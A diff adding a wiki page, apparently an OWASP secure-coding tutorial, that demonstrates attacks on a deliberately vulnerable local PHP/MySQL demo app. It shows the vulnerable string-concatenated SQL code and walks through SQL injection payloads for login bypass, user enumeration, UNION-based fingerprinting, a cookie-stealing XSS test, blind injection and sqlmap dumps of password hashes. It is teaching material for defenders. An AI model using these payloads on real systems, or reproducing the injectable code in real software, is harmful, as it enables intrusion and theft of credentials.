@@ -1,0 +1,314 @@
+= Overview =
+
+= Description =
+
+== Source Code Exposure ==
+
+As you can see ''login.php'' include ''db.inc'' to use ''iMysqlConnect'' whose aims is to
+return a resource link to backend MySQL engine. Since ''.inc'' files are not rendered
+by WEB Server through the ''PHP Module'' an evil user may retrieve it's content as shown
+in the following images:
+
+[[Image:Owasp_bsp_php_2.jpg]]
+
+
+== Authentication Bypass ==
+
+
+On our examples user credentials are passed to ''login.php'' wich in turns call the following
+PHP function:
+ 
+ 
+ <nowiki>
+function sAuthenticateUser($username, $password){
+  $authenticatedUserName="";
+  if ($link = iMysqlConnect()) {
+
+    $query  = "SELECT username FROM users";
+    $query .=                " WHERE username = '".$username."'";
+    $query .=                " AND   password = md5('".$password."')";
+    $result = mysql_query($query);
+
+    if ($result) {
+      if ($row = mysql_fetch_row($result)) {
+      $authenticatedUserName =  $row[0];
+      }
+    }
+  }
+
+  return $authenticatedUserName;
+
+}
+</nowiki>
+
+When user ''larry'' authenticate the following SQL Query it's executed:
+* SELECT username FROM users WHERE username='larry' AND password=md5('larry')
+
+Breaking such an authentication schema is quite simple, since we need to :
+
+* truncate backend authentication query
+* injection a boolean expression to override WHERE clausole
+
+
+* On MySQL ''#'' is used as a comment character then whatever follows is discarderd from the engine.
+* Since our WHERE clausole is something like ''expr AND expr'' we can override it by adding an identity expresssion (E.g.: OR 1=1)
+
+
+It follows that authentication can be bypassed by supplying the following credentials:
+* username: ''' OR 1=1#''
+* password: ''password''
+
+* username: ''username''
+* password: ''') OR 1=1 #''
+
+
+== User Enumeration ==
+
+We learned on previous section that an evil user can bypass authentication schema by supplying 
+the following credentials:
+
+* username: '''OR 1=1#''
+* password: ''password''
+
+Let'say again what does ''sAuthenticateUser'' performs:
+
+ <nowiki>
+function sAuthenticateUser($username, $password){
+  $authenticatedUserName="";
+  if ($link = iMysqlConnect()) {
+
+    $query  = "SELECT username FROM users";
+    $query .=                " WHERE username = '".$username."'";
+    $query .=                " AND   password = md5('".$password."')";
+    $result = mysql_query($query);
+
+    if ($result) {
+      if ($row = mysql_fetch_row($result)) {
+      $authenticatedUserName =  $row[0];
+      }
+    }
+  }
+
+  return $authenticatedUserName;
+
+}
+</nowiki>
+
+As you can see $query will contains the following SQL statement:
+* SELECT username FROM users WHERE username = '' OR 1=1#' AND   password = md5('password')
+
+wich in turns will be executed in:
+
+ <nowiki>
+  $result = mysql_query($query);  
+</nowiki>
+
+By adding a ''LIMIT'' operator after the ''OR'' clausole we can index every valid user with the following
+queries:
+
+* SELECT username FROM users WHERE username = '' OR 1=1 LIMIT 0,1
+* SELECT username FROM users WHERE username = '' OR 1=1 LIMIT 1,1
+* SELECT username FROM users WHERE username = '' OR 1=1 LIMIT 2,1
+* ''.... and so on''
+
+We can accomplish the above task by supplying the following ''username/password'' pairs:
+* username: ''' OR 1=1 LIMIT 0,1#''
+* password: ''password''
+
+* username: ''' OR 1=1 LIMIT 1,1#''
+* password: ''password''
+
+* username: ''' OR 1=1 LIMIT 2,1#''
+* password: ''password''
+
+== UNION SELECT Injection ==
+
+Since our Application is vulnerable to SQL Injection attacks we can injection a ''UNION SELECT'' statement
+to execute arbitrary expression agains remote backend system. Our first attempt will show how to retrieve
+DBMS Fingerprint.
+
+To this aim we need to set up a UNION SELECT injection wich in turns need to know how many expression are evaluated on original SELECT statement. Let'try:
+
+* ''<nowiki>id=1 UNION ALL SELECT NULL# </nowiki>'' differs from original page (id=1)
+* ''<nowiki>id=1 UNION ALL SELECT NULL,NULL# </nowiki>'' differs from original page (id=1)
+* ''<nowiki>id=1 UNION ALL SELECT NULL,NULL,NULL# </nowiki>'' differs from original page (id=1)
+* ''<nowiki>id=1 UNION ALL SELECT NULL,NULL,NULL,NULL# </nowiki>'' differs from original page (id=1)
+* ''<nowiki>id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL# </nowiki>'' equals to original page (id=1)
+
+Well we just guessed that original page (''id=1'') evaluates 5 expression on ''SELECT'' statement.
+ 
+
+* Retrieve DBMS banner
+*: ''id=1 UNION ALL SELECT NULL,version(),NULL,NULL,NULL LIMIT 1,1#"'
+* Retrieve current user
+*: ''id=1 UNION ALL SELECT NULL,user(),NULL,NULL,NULL LIMIT 1,1#''
+
+== Client Side SQL Injection ==
+
+If data retrieved from backend Database in not properly validated we can exploit SQL Injection vulnerabilities in ''catalog.php'' to perform a Cross Site Scripting Attack as well:
+
+* ''<nowiki>id=1 UNION ALL SELECT NULL,'<script>alert(document.cookie)</script>',NULL,NULL,NULL LIMIT 1,1#''</nowiki>
+
+
+[[Image:Owasp_bsp_php_4.jpg]]
+
+
+== BLIND SQL Injection ==
+
+While a SQL Injection occours web server may responds with error message describing why 
+remove database engine fails to execute SQL statement. Sometime network administrator properly tune
+WEB Server to hide error message. When it occours you don't know if SQL Injection has been executed with no errors at all. Blind SQL Injection is identical except that attacker need to compare orginal page with the one where SQL statement has been injected in some way.
+
+
+We know that ''catalog.php'':
+
+ <nowiki>function aGetBookEntry($id) {
+  $aBookEntry = NULL;
+  $link = iMysqlConnect();
+
+  $query = "SELECT * FROM books WHERE id = $id";
+  $result = mysql_query($query);
+
+  if ($result) {
+    if ($row = mysql_fetch_array($result)) {
+      $aBookEntry = $row;
+    }
+  }
+
+  return $aBookEntry;
+
+}
+</nowiki> 
+
+query backend database with the following SQL statement:
+
+ <nowiki> SELECT * FROM book WHERE id=$_GET['id']</nowiki>
+
+which will retrieve the same record set of:
+
+ <nowiki> SELECT * FROM book WHERE id=$_GET['id'] AND 1=1</nowiki>
+
+while the following will retrieve an empty record set:
+
+ <nowiki> SELECT * FROM book WHERE id=$_GET['id'] AND 1=0</nowiki>
+
+You can easily guess than ''Blind SQL Injection'' can be checked by supplying to ''catalog.php'' the
+followings ''id'' parameters:
+* ''id=1 AND 1=1''
+* ''id=1 AND 1=0''
+
+First one will return the same page of ''/catalog.php?id=1'', latter will return a completely different pages. It's worst noticing that we can replace the above ''TRUE'' statement (''1=1'') with what ever we want to compare as a ''TRUE'' boolean identity expression.
+
+== Database Enumeration ==
+
+Blind SQL Injection is a very usefull attacks to enumerate backend DBMS data. We'll see in this section how to accomplish this task.
+
+As you remember our WEB Page is vulnerable to Blind SQL Injection since:
+
+* <nowiki> /catalog.php?id=1</nowiki> gives the same contents of <nowiki>/catalog.php?id=1 AND 1=1</nowiki>
+* <nowiki> /catalog.php?id=1</nowiki> differs from <nowiki>/catalog.php?id=1 AND 1=0</nowiki>
+
+'''Replacing TRUE expression: 1=1:''' 
+
+Let's start with a simple example. We want to enumerate current database name. MySQL has a builtint function
+to accomplish this task: ''database()'':
+
+ <nowiki> SELECT database()</nowiki>
+
+''database()'' returns a string containing current database name. To find it's values through a Blind SQL Injection we need to catch out one character at time from it's result value.
+
+'''How to find out database() length:'''
+
+We know that ''SELECT LENGTH(database())'' return length of current database name. How can we find out it's value?
+
+By starting from 1 we need to compare original WEB Page with:
+* id=1 AND (LENGTH(database()) = 1)
+* id=1 AND (LENGTH(database()) = 2)
+* id=1 AND (LENGTH(database()) = 3)
+''....''
+
+until we find contents from starting page:
+* ''id=1 AND (LENGTH(database()) = 5)''
+
+We just find that current database name length is equals to five. Next step is to enumerate it's characters.
+
+''' database() chars enumeration: '''
+
+To this aim we need to use:
+* ''SUBSTR(string, offset, length):'' returns a substring of ''string'' starting from ''offset'' till
+''offset + length - 1''
+* ''ORD(char):'' returns ASCII value of ''char''
+
+It's easy to guess that:
+
+* ''ORD(SUBSTR(database,1,1)'' will return first char of ''database()
+* ''ORD(SUBSTR(database,2,1)'' will return second char of ''database()
+* ''ORD(SUBSTR(database,3,1)'' will return third char of ''database()
+and so on.
+
+These are some of techniques used by ''sqlmap'' to enumerate DBMS contents by exploiting a Blind SQL Injection Vulnerability.
+
+  <nowiki>
+[522] belch@wild:sqlmap/ => ./sqlmap.py --current-db -u "http://localhost/owaspbes/securecoding/catalog.php?id=1"
+
+    sqlmap/0.6-rc5 coded by inquis <bernardo.damele@gmail.com>
+                    and belch <daniele.bellucci@gmail.com>
+    
+[*] starting at: 23:45:06
+
+remote DBMS:    MySQL >= 5.0.0
+
+current database:    'owasp'
+
+[*] shutting down at: 23:45:08
+</nowiki>
+
+
+  <nowiki>
+[526] belch@wild:sqlmap/ => ./sqlmap.py --tables --database owasp -u "http://localhost/owaspbes/securecoding/catalog.php?id=1" 
+
+    sqlmap/0.6-rc5 coded by inquis <bernardo.damele@gmail.com>
+                    and belch <daniele.bellucci@gmail.com>
+    
+[*] starting at: 23:46:44
+
+remote DBMS:    MySQL >= 5.0.0
+
+Database: owasp
+[2 tables]
++-------+
+| books |
+| users |
++-------+
+
+[*] shutting down at: 23:46:47
+
+</nowiki>
+
+
+  <nowiki>
+[533] belch@wild:sqlmap/ => ./sqlmap.py  -T users --database owasp --dump -u "http://localhost/owaspbes/securecoding/catalog.php?id=1" 
+
+    sqlmap/0.6-rc5 coded by inquis <bernardo.damele@gmail.com>
+                    and belch <daniele.bellucci@gmail.com>
+    
+[*] starting at: 23:48:08
+
+remote DBMS:    MySQL >= 5.0.0
+
+Database: owasp
+Table: users
+[3 entries]
++----+----------------------------------+----------+
+| id | password                         | username |
++----+----------------------------------+----------+
+| 1  | 66f4b449b3a98abf87f2521e35513542 | larry    |
+| 2  | 3b87c97d15e8eb11e51aa25e9a5770e9 | harry    |
+| 3  | 21232f297a57a5a743894a0e4a801fc3 | admin    |
++----+----------------------------------+----------+
+
+[*] shutting down at: 23:48:22
+
+
+
+</nowiki>
